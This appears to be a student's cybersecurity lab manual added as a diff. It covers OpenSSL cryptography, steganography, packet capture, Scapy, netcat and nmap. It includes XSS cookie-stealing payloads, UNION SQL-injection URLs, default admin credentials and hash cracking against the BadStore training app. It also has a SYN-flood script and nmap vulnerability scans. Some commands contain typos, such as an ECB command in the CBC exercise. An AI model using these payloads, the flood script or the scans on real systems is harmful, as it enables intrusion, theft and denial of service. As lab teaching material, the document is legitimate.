@@ -1,0 +1,601 @@
+1a) Demonstrate the usage of steganography tools for hiding text inside an image. Also demonstrate how to recover a corrupted image using hexed editor.
+	
+Open notepad,create 2 txt files named t1.txt and t2.txt(type 2 lines in each)->save it inside cryptos folder
+Dowload 2 png images(source.png and stego.png) and save to cryptos folder
+Now create a new zip file(t3.zip) inside the cryptos folder ->hving t1.txt and t2.txt
+Open terminal-> copy /B source.png + t3.zip stego.png  //U will get output as source.png and t3.zip 1 file(S)copied
+Next open stego.png with winrar //the text files will be moved inside tht png
+
+1b) Demonstrate the working of ECB and CBC modes of AES on plaintext using OpenSSL.
+
+Open seed in VM-terminal
+for cbc,
+gedit plain.txt //type 4 lines in the txt file
+openssl enc -aes-256-cbc -pass pass:root123 -p -in plain.txt -out file.txt //U will get,salt=357.. key= ,iv...
+cat file.txt
+openssl enc -aes-256-cbc -pass pass:root123 -d -in file.txt -out file1.txt //U will get the text tht u hd typed intially in plain.txt as o/p
+--
+for ecb,
+gedit plain.txt //type 4 lines in the txt file
+openssl enc -aes-256-ecb -pass pass:root123 -p -in plain.txt -out file.txt //U will get,salt=357.. key= ,iv...
+cat file.txt
+openssl enc -aes-256-ecb -pass pass:root123 -d -in file.txt -out file1.txt //U will get the text tht u hd typed intially in plain.txt as o/p
+
+1c) Using RSA encrypt “This is cyber security lab. BNMIT Bengaluru”
+
+
+2a) Demonstrate the usage of steganography tools for hiding text in an audio file.
+
+STEPS:
+Open paint-black bg ,white text - save as bmp file.
+Open the saved bmp in COAGULA LIGHT-Click on 'Render img without noise\blue'-Save as sound file-.wav //.wav extension
+Open SONIC VISUALIZER - open the .wav file - Layer menu - Add spectogram for all channels //The hidden text is seen in the audio file by zooming
+
+2b) Demonstrate the workings of the ECB and CBC modes of AES on a bitmap image using OpenSSL.
+
+STEPS:
+Open paint-choose shapes-draw star-fill colour red-save as bitmap image(pic_original.bmp) //(use drag n drop or gmail in the virtualbox to open the bitmap image )
+or
+Open pic_original.bmp in google and open the crypto-lab link -under files needed u get a link pic_original.bmp//download it
+--
+Open terminal in seed
+for ecb,
+openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bmp -k 112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+eog pic_ecb.bmp //will not display any image(error)
+head -c 54 pic_original.bmp > header
+tail -c +55 pic_ecb.bmp > body_ecb
+cat header body_ecb > new_ecb.bmp
+eog new_ecb.bmp  //this will display tht star in a blurred format
+--
+for cbc,
+openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_cbc.bmp -k 112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+eog pic_cbc.bmp // will not display any img(error)
+head -c 54 pic_original.bmp > header
+tail -c +55 pic_cbc.bmp > body_cbc
+cat header body_cbc > new_cbc.bmp
+eog new_cbc.bmp //this will display full blur image
+
+2c) Make use of wireshark packet capture tool and demonstate the security of http and https protocol. And also demonstate TCP hand shake protocol.
+
+STEPS:
+FOR HTTP,
+Open wireshark,stop capture.
+Then start capture again.
+Open http://example.com/ ->in wireshark ->apply filter http ->port no:80 to be shown
+FOR HTTPS,
+Open wireshark,stop capture.
+Then start capture again.
+Open https://example.com/ ->in wireshark ->apply filter ssl ->port no:443 to be shown
+----------------------------------------------------------------------------------------
+
+3a) Demonstrate the effects of padding in AES using OpenSSL.
+
+STEPS:
+Open terminal in seed,type
+echo -n "12345">f1.txt
+echo -n "123456789">f2.txt
+echo -n "1234567890abcdef">f3.txt
+ls -l f*.txt //check for f1,f2,f3
+Next,type
+openssl enc -aes-128-cbc -e -in f1.txt -out f1.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+openssl enc -aes-128-cbc -e -in f2.txt -out f2.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+openssl enc -aes-128-cbc -e -in f3.txt -out f3.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+xxd f1.bin // displayed encrypted values
+xxd f2.bin
+xxd f3.bin
+Next,type
+openssl enc -aes-128-cbc -d -in f1.bin -out f11.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+openssl enc -aes-128-cbc -d -in f2.bin -out f22.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+openssl enc -aes-128-cbc -d -in f3.bin -out f33.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+xxd f11.bin // displays 12345 with padding(Spacing)
+xxd f22.bin //displays  123456789 with padding
+xxd f33.bin //displays 1234567890abcdef with padding
+
+Next,type
+openssl enc -aes-128-cbc -d -in f1.bin -out p1.txt -nopad -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0d0e0f
+gedit p1.txt //opens a p1.txt file -displays 12345 followed by some encodings
+
+3b) Demonstrate the usage of tcpdump to capture packets based on different filters and protocols. Also demonstrate storing and retrieving data from files.
+
+STEPS:
+tcpdump,
+Open seed terminal,type
+ifconfig //take ip address
+sudo tcpdump host 198.168.5.50 //ip address of ur website-specified host
+sudo tcpdump -i enp0s3 //give ctrl c ..this is for specified interface
+sudo tcpdump port 80//specified port
+
+sudo tcpdump port 80 -w httppkt.pcap //do not press enter ,open http://example.com ..then come to terminal and press enter and refresh the exmaple.com site for thrice
+sudo tcpdump -r httppkt.pcap //reading the file
+cat httppkt.pcap
+next open wireshark and click on the file like icon-5th icon and type the file name httppkt.pcap
+
+For ICMP,
+Open 2 terminals, 
+ping bnmit.org //1st terminal
+sudo tcpdump icmp and host 192.168.1.2 -w icmppkt.pcap//2nd terminal
+sudo tcpdump icmp and host 192.168.1.2 -r icmppkt.pcap
+next open wireshark and click on the file like icon-5th icon and type the file name icmppkt.pcap
+
+3c) Demonstrate the use copy command by embedding two text files having your name in one text file and your USN in second text file into a image file.
+
+4a) Demonstrate the key generation, encryption, and decryption procedure of the RSA algorithm using OpenSSL. Also demonstrate the encryption of a secret key using an RSA keypair.
+STEPS:
+Open terminal in seed,type
+openssl rand -hex 16
+openssl rand -hex 32
+openssl rand -hex -out some_data 32
+cat some_data
+
+Next, type
+openssl genrsa //Displays begin and end RSA private key
+openssl genrsa 1024 //displays rsa private key
+
+Next,type
+openssl genrsa 1024 > key.pri //generates rsa private key
+openssl rsa -in key.pri -out key.pub -pubout //writing rsa key
+gedit newrsa.txt // type 2 full sentences in 2 lines in the text file
+openssl rsautl -encrypt -inkey key.pub -pubin -in newrsa.txt -out Earth.enc
+xxd Earth.enc //displays some values
+openssl rsautl -decrypt -inkey key.pri -in Earth.enc -out Earth.dec
+xxd Earth.dec //displays the 2 lines tht u hd typed in newrsa.txt
+
+Next type,
+openssl rand -hex -out encryption.key 32
+openssl rsautl -encrypt -inkey key.pub -pubin -in encryption.key -out encryption.key.enc
+openssl rsautl -decrypt -inkey key.pri -in encryption.key.enc -out encryption.key.dec
+cmp encryption.key encryption.key.dec //if u get no output after this cmd..then it means u hv got the crct o/p
+
+4b) Capture and analyze the HTTP and HTTPS packets for example.com using the Wireshark tool.
+
+STEPS:
+FOR HTTP,
+Open wireshark,stop capture.
+Then start capture again.
+Open http://example.com/ ->in wireshark ->apply filter http ->port no:80 to be shown
+FOR HTTPS,
+Open wireshark,stop capture.
+Then start capture again.
+Open https://example.com/ ->in wireshark ->apply filter ssl ->port no:443 to be shown
+---------------------------------------------------------------------------------------
+
+4c) Demonstrate the working of AES ECB encryption and decryption using openssl tool on a text file having the contents "Welcome to BNM Institute of Technology, Cyber lab".
+
+--
+for ecb,
+gedit plain.txt //type "Welcome to BNM Institute of Technology, Cyber lab"  in the txt file
+openssl enc -aes-256-ecb -pass pass:root123 -p -in plain.txt -out file.txt //U will get,salt=357.. key= ,iv...
+cat file.txt
+openssl enc -aes-256-ecb -pass pass:root123 -d -in file.txt -out file1.txt //U will get the text tht u hd typed intially in plain.txt as o/p
+
+5a) BadStore’s cart cookie is also an encoded string with a predictable structure XXX:YYY:… etc., and it probably contains information it shouldn’t. Which field of the decoded string could an attacker change to give himself a discount on an item’s price?
+
+Login as joe@supplier.com -> iforgot
+go to whats new ->add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+After getting the CartID value , and url-decoding it using https://www.urldecoder.org
+ CartID=1527258326%3A1%3A11.5%3A1000; 
+
+After url-decoding 1527258326:1:11.5:1000 
+
+Field 1 : 1527258326 is a unix timestamp 
+Field 2 : “Useless” 
+Field 3 : 11.5 is the price 
+Field 4 : 1000 is the item id. 
+So the attacker needs to edit the price field which is the third order.
+
+5b) Using Scapy, create a frame that consists of an Ethernet layer, with an IP layer on top? With the show method, capture all fields of the frame
+
+Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following 3 cmds below:
+ >>> from scapy.all import *
+ >>> my_frame=Ether()/IP(dst="8.8.8.8")
+ >>> my_frame  //u will get ether type and ip
+ >>> my_frame.show()  //this will show version,flags src...
+
+5c) Write a Shell script for port scan using NetCat
+
+port_scan.sh:
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+gedit porti_scan.sh
+chmod +x port_scan.sh
+./port_scan.sh
+ex: Starting Port Number : 80, Ending Port Number: 82
+
+6a) Log in as joe@supplier.com to Badstore— — this is possible in a variety of ways, including SQL injection. Then look at his previous orders and answer the question: What credit card number did he use to make a purchase of $46.95? Multiple answers are possible.
+
+Ans:
+Log in as joe(in Login/Register but not in supplier Login)
+You will see a button on the left , to view joe orders(view previous orders), which will take you to http://192.168.1.111/cgi-bin/badstore.cgi?action=viewprevious
+
+Ctrl+F , after the page has loaded to search for $46.95 We got all credit cards of joe 
+
+Answer: 4111 1111 1111 1111 , 5500 0000 0000 0004
+
+6b) How to Sniff with Scapy (for 10 packets and show the details of all the packets).
+
+sniff.py:
+from scapy.all import *
+packets = sniff(count = 10)
+packets.summary()
+
+chmod +x sniff.py
+sudo python3 sniff.py
+
+6c) Using NetCat, show how to Communicate with the server using 2 terminals and across systems
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+
+On Client Side:
+
+ifconfig (get current ip address)
+nc -v <ip_address> <port_number> (ex: 5000)
+
+7a) Demonstrate how to perform traceroute in Scapy
+traceroute.py:
+from scapy.all import * 
+ans, unans = traceroute(["8.8.8.8"], maxttl=20) 
+
+chmod +x traceroute.py
+sudo python3 traceroute.py
+
+7b) Using NetCat, show the usage of HTML  Request/Response (HEAD /GET).
+
+Ans: Go to seed vm ,open termial and type:
+
+gedit a.txt//inside this file type and keep this for quickly copy n pasting
+GET / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.47.0
+Accept:*/*
+
+After typing this inside the text file,come back to terminal n type,    
+
+nc -v example.com 80 //it will show connection success msg
+Soon after the success message copy the lines u typed in the text file and paste it here in terminal like below
+
+GET / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.47.0
+Accept:*/*
+
+This will give the response as output 
+
+Similarly follow the same procedure for HEAD.Use the below lines for it.
+
+HEAD / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.47.0
+Accept:*/*
+
+7c) Using Nmap perform Ping Scan (determine which hosts are up). Also show how to scan a single IP.
+
+nmap -sn <website_url> or <ip_address>
+
+8a) Write a python code using Scapy for creating a Network Scanner (Hint: Create an ARP packet using ARP() method )
+
+arp.py:
+from scapy.all import * 
+arp = ARP(pdst="192.168.1.0/24") 
+broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
+packet = broadcast/arp 
+ans, _ = srp(packet, timeout=1, verbose=0) 
+for sent, received in ans: 
+	print(received.psrc, received.hwsrc) 
+
+chmod +x arp.py
+sudo python3 arp.py
+
+
+8b) Using NetCat, show communication between browser and the server. (for plain text)
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// localhost:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+
+8c) Using Nmap, Scan a range of IPs. Also scan an entire subnet. 
+
+nmap 192.168.1.10-20 
+nmap 192.168.1.0/24 
+
+9a) Demonstrate SYN flood attack using Scapy
+
+flood.py:
+from scapy.all import * 
+while True: 
+	send(IP(dst="target_ip")/TCP(dport=80, flags="S")) 
+
+chmod +x flood.py
+sudo python3 flood.py
+
+9b) Using NetCat, show communication between browser and the server. (for an image)
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// localhost:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+  <body>
+    <h2>Remote Image Test</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+  </body>
+</html>
+
+9c) Using Nmap, Scan specific ports. Also show how to scan all 65535 ports.
+
+nmap -p 22,80,443 192.168.1.1 
+nmap -p- 192.168.1.1 
+
+10a) BadStore uses cookies to track the contents of the cart, once you’ve added something to it. What is the key of the cookie used for the cart?
+
+Login as joe@supplier.com -> iforgot
+go to whats new -> add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+Answer : cartId
+
+10b) Write a Shell script for port scan using NetCat.
+
+port_scan.sh:
+#!/bin/bash
+host="www.example.com" 
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+for (( port=start_port; port<=end_port; port++ ))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+gedit porti_scan.sh
+chmod +x port_scan.sh
+./port_scan.sh
+ex: Starting Port Number : 80, Ending Port Number: 82
+
+10c) Using Nmap, scan top 1000 ports (default). Also show how to detect service version
+
+nmap bnmit.org
+Again for showing service version ,under cmd type:    
+    nmap -sV example.com
+
+11a) Demonstrate how to Send ICMP packets in Scapy and show the packet captured using Wireshark to destination 8.8.8.8
+
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+>>> frame=Ether()/IP(dst="8.8.8.8")/ICMP()
+>>> frame //U will get this as output ..<Ether  type=IPv4 |<IP  frag=0 proto=icmp dst=8.8.8.8 |<ICMP  |>>>
+After that open wireshark and start capture,and come back to cmd prompt and type
+>>> sendp(frame) //capture the packet in wireshark...apply icmp filter and observe it
+
+11b)	Using NetCat, show communication between browser and the server (for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// localhost:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+  <body>
+    <h2>Remote Image Test</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+  </body>
+</html>
+
+11c) How many items for purchase are in BadStore’s database? Use SQL injection on the quick search form field to find out
+
+(answer : 16)
+On the search box , type any thing for example just x or type this:
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=x&action=search&x=11&y=9
+Next type this in search : 
+  Type the url:
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=x%27+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9
+We can count them manually or type this url:   
+    (type this final url enough ): 
+http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x%27+union+select+count%28itemnum%29%2Ccount%28itemnum%29%2Ccount%28itemnum%29%2Ccount%28itemnum%29+from+itemdb+--+&action=search&x=11&y=9
+
+12a) Demonstrate how to Perform a Port Scan using Scapy tool on target www.example.com.
+
+portscan_scapy.py:
+from scapy.all import * 
+for port in range(20, 30): 
+pkt = IP(dst="www.example.com")/TCP(dport=port, flags="S") 
+resp = sr1(pkt, timeout=0.5, verbose=0) 
+if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 18: 
+	print(f"Port {port} is open") 
+
+12b) Using Nmap, Scan for vulnerabilities.
+
+nmap --script vuln -oN scan_results.txt 192.168.1.1 
+
+12c) What operations are suppliers permitted to do once they have logged into the “suppliers only” area? Use SQL injection to bypass authentication, or find a way to create an account as a supplier
+
+(answer: Upload Price Lists)
+
+Login using admin:secret
+Type this url: http://192.168.36.143/cgi-bin/badstore.cgi?action=admin
+
+The admin panel shows some options , we will select show current users -> do it
+
+joe@supplier.com 62072d95acb588c7ee9d6fa0c6c85155 green Joe SupplierS   take this
+
+get the plain password from: https://md5.gromweb.com/?md5=62072d95acb588c7ee9d6fa0c6c85155 
+After loggin in as a supplier , you will be redirected to : http://192.168.1.111/cgi-bin/badstore.cgi?action=supplierportal
+And you have the option to Upload price Lists So the answer is :Upload Price Lists
+
+13a) Using NetCat, show communication between browser and the server (for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// localhost:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+  <body>
+    <h2>Remote Image Test</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+  </body>
+</html>
+
+13b) Using Nmap, Scan a range of IPs. Also scan an entire 
+
+nmap 192.168.1.10-20 
+nmap 192.168.1.0/24 
+
+13c) Log in as joe@supplier.com — — this is possible in a variety of ways, including SQL injection. Then look at his previous orders and answer the question: What credit card number did he use to make a purchase of $46.95? Multiple answers are possible, but we will accept all of them
+
+Ans:
+Log in as joe(in Login/Register but not in supplier Login)
+You will see a button on the left , to view joe orders(view previous orders), which will take you to http://192.168.1.111/cgi-bin/badstore.cgi?action=viewprevious
+
+Ctrl+F , after the page has loaded to search for $46.95 We got all credit cards of joe 
+
+Answer: 4111 1111 1111 1111 , 5500 0000 0000 0004
+
+14a) Create a simple network monitor that watches for ICMP packets using python function callback in Scapy
+
+from scapy.all import * 
+def icmp_monitor(pkt): 
+	if pkt.haslayer(ICMP): 
+		print("ICMP Packet:", pkt.summary()) 
+sniff(filter="icmp", prn=icmp_monitor) 
+
+14b) Using Nmap, scan the top 1000 ports (default). Also show how to detect service version.
+
+nmap bnmit.org
+Again for showing service version ,under cmd type:    
+    nmap -sV example.com
+
+14c) Get administrator privileges and then use the admin action to look at the user database. There are two users whose emails have the form XXX@whole.biz; what is the XXX portion of either of the two users? For example, if one of the users is jackie@whole.biz, the right answer is jackie. (The answer is case-sensitive.)
+
+After logging in with admin account: admin:secret Navigate to : or 
+http://192.168.1.111/cgi-bin/badstore.cgi?action=admin 
+And view users accounts , CTRL+F and search for whole.biz
+We got two matches : fred@whole.biz landon@whole.biz 
+
+Answer: fred , landon 
+
+15a) Using Nmap show OS detection. Also demonstrate how to perform Aggressive scan. 
+
+Open Nmap or Zenmap,
+ Under cmd field type:
+    nmap -O example.com
+ Again for Aggressive scan under cmd type:
+    nmap -A example.com
+
+15b) Using NetCat show communication between browser and the server (for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// localhost:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+  <body>
+    <h2>Remote Image Test</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+  </body>
+</html>
+
+15c) BadStore uses cookies to implement a session key, once you’ve authenticated, and for tracking the contents of the cart, once you’ve added something to it. You can figure out the cookies in use by BadStore in various ways. What is the key of the session cookie?
+
+Ans:
+Login as admin->secret
+in search box -> <script>alert(document.cookie)</script>
+
+16a) Display the route and measure transit delays of packets across an IP network with Scapy (on www.example.com, www.google.com)
+
+from scapy.all import * 
+traceroute(["www.example.com", "www.google.com"]) 
+
+16b) Using NetCat, show communication between browser and the server(for an image).
+
+Make 2 terminals
+-> Server side
+-> Client side
+
+On Browser Side:
+
+https:// localhost:<port_number>
+
+On Server Side:
+
+nc -vlp <port_number> (ex: 5000)
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<html>
+  <body>
+    <h2>Remote Image Test</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png">
+  </body>
+</html>
+
+16c) BadStore uses cookies to track the contents of the cart, once you’ve added something to it. What is the key of the cookie used for the cart?
+
+Login as joe@supplier.com -> iforgot
+go to whats new -> add items to cart
+in search bar -> <script>alert(document.cookie)</script>
+Answer : cartId
